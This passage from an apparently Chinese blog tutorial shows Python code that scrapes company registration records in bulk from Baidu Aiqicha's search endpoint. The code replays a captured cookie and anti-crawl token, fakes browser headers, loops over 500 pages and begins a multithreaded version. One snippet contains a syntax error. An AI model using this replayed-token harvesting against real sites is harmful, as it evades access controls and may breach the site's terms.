class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>: <span class="string">&#x27;抓到的cookie&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;aiqicha.baidu.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua&#x27;</span>: <span class="string">&#x27;&quot;Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;114&quot;, &quot;Google Chrome&quot;;v=&quot;114&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Platform&#x27;</span>: <span class="string">&#x27;&quot;Windows&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Ymg_ssr&#x27;</span>: <span class="string">&#x27;1686132225976_1686209020456_Krd2ws59qA1TALmBzJb0wdzDayRK14xrDbs2NsxGZghPtW2AaG8K4Now6K/zTfBecE9i1aegJL5KTT+cxrK6j9JK2ix9MoT8+qWljBqcj0i1PEU+RTVvgGjdlkPqamJydND6fQSkBidmHrZVhBXKSiqByC1knHzxmFJl0d+FYKOIK5Yue9P/KBLU2Q3FIF1YsrkslH8qYriHAg5MNXzRTlrU4gdLir4fXP++E+JwOUR2jkA8Mv4vTuUOG7crcKk2W+omKed78e4P6vi6j3qgdk6Pc4jel6aItYE8iTIAZCAcJNP4raFja3p6Eb/KAqre&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Zx-Open-Url&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">&quot;https://aiqicha.baidu.com/s/advanceSearchAjax&quot;</span></span><br><span class="line">    response = requests.get(url, headers=headers, params=params)</span><br><span class="line">    resultList = response.json()[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;resultList&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> resultList:</span><br><span class="line">        <span class="built_in">print</span>(item)</span><br><span class="line">        <span class="built_in">print</span>(item[<span class="string">&#x27;entName&#x27;</span>])</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>4.成功爬取结果:<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011550787.png" alt="image.png"></p><p>与browser访问一致<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011551205.png" alt="image.png"></p><p>5.爬取内容后保存至文件中</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">n</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment">#写入文件</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;./a.txt&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;p&quot;</span>: <span class="string">&quot;1&quot;</span>.</span><br><span class="line">        <span class="string">&quot;s&quot;</span>: <span class="string">&quot;10&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;&#123;&quot;regCap&quot;:[&#123;&quot;start&quot;:5000,&quot;end&quot;:0&#125;],&quot;regCapType&quot;:[&quot;1&quot;],&quot;openStatus&quot;:[&quot;开业&quot;]&#125;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;o&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>: <span class="string">&#x27;抓到的cookie&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;aiqicha.baidu.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua&#x27;</span>: <span class="string">&#x27;&quot;Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;114&quot;, &quot;Google Chrome&quot;;v=&quot;114&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Platform&#x27;</span>: <span class="string">&#x27;&quot;Windows&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Ymg_ssr&#x27;</span>: <span class="string">&#x27;1686132225976_1686209020456_Krd2ws59qA1TALmBzJb0wdzDayRK14xrDbs2NsxGZghPtW2AaG8K4Now6K/zTfBecE9i1aegJL5KTT+cxrK6j9JK2ix9MoT8+qWljBqcj0i1PEU+RTVvgGjdlkPqamJydND6fQSkBidmHrZVhBXKSiqByC1knHzxmFJl0d+FYKOIK5Yue9P/KBLU2Q3FIF1YsrkslH8qYriHAg5MNXzRTlrU4gdLir4fXP++E+JwOUR2jkA8Mv4vTuUOG7crcKk2W+omKed78e4P6vi6j3qgdk6Pc4jel6aItYE8iTIAZCAcJNP4raFja3p6Eb/KAqre&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Zx-Open-Url&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">&quot;https://aiqicha.baidu.com/s/advanceSearchAjax&quot;</span></span><br><span class="line">    response = requests.get(url, headers=headers, params=params)</span><br><span class="line">    result = response.json()[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;resultList&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> result:</span><br><span class="line">        a = <span class="string">&quot;公司名称:&quot;</span>+item[<span class="string">&#x27;entName&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;注册资金:&quot;</span>+item[<span class="string">&#x27;regCap&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司类型:&quot;</span>+item[<span class="string">&#x27;entType&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司成立时间:&quot;</span>+item[<span class="string">&#x27;validityFrom&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司地址:&quot;</span>+item[<span class="string">&quot;domicile&quot;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&#x27;开业状况:&#x27;</span>+item[<span class="string">&quot;openStatus&quot;</span>]+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        f.write(a)</span><br><span class="line"></span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011551558.png" alt="image.png"></p><p>6.爬取多页信息</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">n</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment">#写入文件</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;./a.txt&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">    m = <span class="built_in">str</span>(n)</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;p&quot;</span>: m,</span><br><span class="line">        <span class="string">&quot;s&quot;</span>: <span class="string">&quot;10&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;&#123;&quot;regCap&quot;:[&#123;&quot;start&quot;:5000,&quot;end&quot;:0&#125;],&quot;regCapType&quot;:[&quot;1&quot;],&quot;openStatus&quot;:[&quot;开业&quot;]&#125;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;o&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>: <span class="string">&#x27;抓到的cookie&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;aiqicha.baidu.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua&#x27;</span>: <span class="string">&#x27;&quot;Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;114&quot;, &quot;Google Chrome&quot;;v=&quot;114&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Platform&#x27;</span>: <span class="string">&#x27;&quot;Windows&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Ymg_ssr&#x27;</span>: <span class="string">&#x27;1686132225976_1686209020456_Krd2ws59qA1TALmBzJb0wdzDayRK14xrDbs2NsxGZghPtW2AaG8K4Now6K/zTfBecE9i1aegJL5KTT+cxrK6j9JK2ix9MoT8+qWljBqcj0i1PEU+RTVvgGjdlkPqamJydND6fQSkBidmHrZVhBXKSiqByC1knHzxmFJl0d+FYKOIK5Yue9P/KBLU2Q3FIF1YsrkslH8qYriHAg5MNXzRTlrU4gdLir4fXP++E+JwOUR2jkA8Mv4vTuUOG7crcKk2W+omKed78e4P6vi6j3qgdk6Pc4jel6aItYE8iTIAZCAcJNP4raFja3p6Eb/KAqre&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Zx-Open-Url&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">&quot;https://aiqicha.baidu.com/s/advanceSearchAjax&quot;</span></span><br><span class="line">    response = requests.get(url, headers=headers, params=params)</span><br><span class="line">    result = response.json()[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;resultList&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> result:</span><br><span class="line">        a = <span class="string">&quot;公司名称:&quot;</span>+item[<span class="string">&#x27;entName&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;注册资金:&quot;</span>+item[<span class="string">&#x27;regCap&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司类型:&quot;</span>+item[<span class="string">&#x27;entType&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司成立时间:&quot;</span>+item[<span class="string">&#x27;validityFrom&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司地址:&quot;</span>+item[<span class="string">&quot;domicile&quot;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&#x27;开业状况:&#x27;</span>+item[<span class="string">&quot;openStatus&quot;</span>]+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        f.write(a)</span><br><span class="line"></span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(<span class="number">1</span>)</span><br><span class="line">    main(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>成功爬取<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011552327.png" alt="image.png"></p><p>运用for循环爬取多页</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">n</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment">#写入文件</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;./a.txt&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">    m = <span class="built_in">str</span>(n)</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;p&quot;</span>: m,</span><br><span class="line">        <span class="string">&quot;s&quot;</span>: <span class="string">&quot;10&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;&#123;&quot;regCap&quot;:[&#123;&quot;start&quot;:5000,&quot;end&quot;:0&#125;],&quot;regCapType&quot;:[&quot;1&quot;],&quot;openStatus&quot;:[&quot;开业&quot;]&#125;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;o&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>: <span class="string">&#x27;抓取的cookie&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;aiqicha.baidu.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua&#x27;</span>: <span class="string">&#x27;&quot;Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;114&quot;, &quot;Google Chrome&quot;;v=&quot;114&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Platform&#x27;</span>: <span class="string">&#x27;&quot;Windows&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Ymg_ssr&#x27;</span>: <span class="string">&#x27;1686132225976_1686209020456_Krd2ws59qA1TALmBzJb0wdzDayRK14xrDbs2NsxGZghPtW2AaG8K4Now6K/zTfBecE9i1aegJL5KTT+cxrK6j9JK2ix9MoT8+qWljBqcj0i1PEU+RTVvgGjdlkPqamJydND6fQSkBidmHrZVhBXKSiqByC1knHzxmFJl0d+FYKOIK5Yue9P/KBLU2Q3FIF1YsrkslH8qYriHAg5MNXzRTlrU4gdLir4fXP++E+JwOUR2jkA8Mv4vTuUOG7crcKk2W+omKed78e4P6vi6j3qgdk6Pc4jel6aItYE8iTIAZCAcJNP4raFja3p6Eb/KAqre&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Zx-Open-Url&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">&quot;https://aiqicha.baidu.com/s/advanceSearchAjax&quot;</span></span><br><span class="line">    response = requests.get(url, headers=headers, params=params)</span><br><span class="line">    result = response.json()[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;resultList&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> result:</span><br><span class="line">        a = <span class="string">&quot;公司名称:&quot;</span>+item[<span class="string">&#x27;entName&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;注册资金:&quot;</span>+item[<span class="string">&#x27;regCap&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司类型:&quot;</span>+item[<span class="string">&#x27;entType&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司成立时间:&quot;</span>+item[<span class="string">&#x27;validityFrom&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司地址:&quot;</span>+item[<span class="string">&quot;domicile&quot;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&#x27;开业状况:&#x27;</span>+item[<span class="string">&quot;openStatus&quot;</span>]+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        f.write(a)</span><br><span class="line"></span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">        main(i)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011553015.png" alt="image.png"></p><h1 id="4-多线程爬虫"><a href="#4-多线程爬虫" class="headerlink" title="4.多线程爬虫"></a>4.多线程爬虫</h1><h3 id="1-普通爬虫"><a href="#1-普通爬虫" class="headerlink" title="1.普通爬虫"></a>1.普通爬虫</h3><p>爬取爱企查500页数据</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">n</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment">#写入文件</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;./a.txt&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">    m = <span class="built_in">str</span>(n)</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;p&quot;</span>: m,</span><br><span class="line">        <span class="string">&quot;s&quot;</span>: <span class="string">&quot;10&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;&#123;&quot;regCap&quot;:[&#123;&quot;start&quot;:5000,&quot;end&quot;:0&#125;],&quot;regCapType&quot;:[&quot;1&quot;],&quot;openStatus&quot;:[&quot;开业&quot;]&#125;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;o&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>: <span class="string">&#x27;抓到的cookie&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;aiqicha.baidu.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua&#x27;</span>: <span class="string">&#x27;&quot;Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;114&quot;, &quot;Google Chrome&quot;;v=&quot;114&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Platform&#x27;</span>: <span class="string">&#x27;&quot;Windows&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Ymg_ssr&#x27;</span>: <span class="string">&#x27;1686132225976_1686209020456_Krd2ws59qA1TALmBzJb0wdzDayRK14xrDbs2NsxGZghPtW2AaG8K4Now6K/zTfBecE9i1aegJL5KTT+cxrK6j9JK2ix9MoT8+qWljBqcj0i1PEU+RTVvgGjdlkPqamJydND6fQSkBidmHrZVhBXKSiqByC1knHzxmFJl0d+FYKOIK5Yue9P/KBLU2Q3FIF1YsrkslH8qYriHAg5MNXzRTlrU4gdLir4fXP++E+JwOUR2jkA8Mv4vTuUOG7crcKk2W+omKed78e4P6vi6j3qgdk6Pc4jel6aItYE8iTIAZCAcJNP4raFja3p6Eb/KAqre&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Zx-Open-Url&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">&quot;https://aiqicha.baidu.com/s/advanceSearchAjax&quot;</span></span><br><span class="line">    response = requests.get(url, headers=headers, params=params)</span><br><span class="line">    result = response.json()[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;resultList&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            a = <span class="string">&quot;公司名称:&quot;</span>+item[<span class="string">&#x27;entName&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;注册资金:&quot;</span>+item[<span class="string">&#x27;regCap&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司类型:&quot;</span>+item[<span class="string">&#x27;entType&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司成立时间:&quot;</span>+item[<span class="string">&#x27;validityFrom&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司地址:&quot;</span>+item[<span class="string">&quot;domicile&quot;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&#x27;开业状况:&#x27;</span>+item[<span class="string">&quot;openStatus&quot;</span>]+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">            f.write(a)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    start = time.time()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">501</span>):</span><br><span class="line">        main(i)</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;直接爬取耗费时间&quot;</span>,(end-start))</span><br></pre></td></tr></table></figure><p>成功爬取5000行数据<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011554700.png" alt="image.png"></p><p>程序耗费时间<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011554254.png" alt="image.png"></p><h3 id="2-多线程爬虫"><a href="#2-多线程爬虫" class="headerlink" title="2.多线程爬虫"></a>2.多线程爬虫</h3><p>开10个线程跑</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">n</span>):</span><br><span class="line">    <span 